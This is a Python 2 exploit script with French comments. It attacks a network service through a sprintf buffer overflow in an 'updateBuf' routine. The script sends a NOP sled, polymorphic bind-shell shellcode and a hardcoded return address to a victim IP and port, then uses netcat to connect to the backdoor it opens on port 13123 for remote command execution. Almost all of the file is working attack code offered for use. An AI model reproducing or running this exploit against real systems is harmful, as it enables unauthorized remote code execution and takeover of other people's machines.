#!/usr/bin/env python2
# vuln qui exploit le sprintf dans updateBuf et qui execute un backdoor

import socket
import os
import time
import sys

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# Polymorphic bindport to 13123 - 125 bytes
# http://www.shell-storm.org/shellcode/files/shellcode-656.php
shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x6c\x0e\xff\x35\x80\xe9\x01" \
            "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x66\xf5\x66\x10\x66\x07" \
            "\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb" \
            "\x87\x9d\xf0\x37\x68\x78\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33" \
            "\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5" \
            "\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe" \
            "\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87" \
            "\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe" \
            "\x16\xe5\x40\x02\xb5"

buff  = "\x90" * (507 - len(shellcode))
buff += shellcode
buff += "\x40\xe8\xff\xbf" # 0xbfffe840
cmdID = "3 "
arg3  = " "+buff
arg2  = str(len(arg3))
payload = cmdID + arg2 + arg3 

print "[+] Send payload..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload"
   sys.exit(1)
print "[+] done!"
print "[+] Waiting backdoor"
time.sleep(3)
concat = "netcat " + sys.argv[1] + " 13123"
print "[+] Connected to the backdoor you can now execute cmd"
os.system(concat)

